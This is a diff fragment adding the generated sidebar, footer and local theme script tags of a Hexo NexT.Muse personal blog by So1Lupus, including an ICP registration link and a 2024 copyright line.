+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">So1Lupus</p>
+  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022029346号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
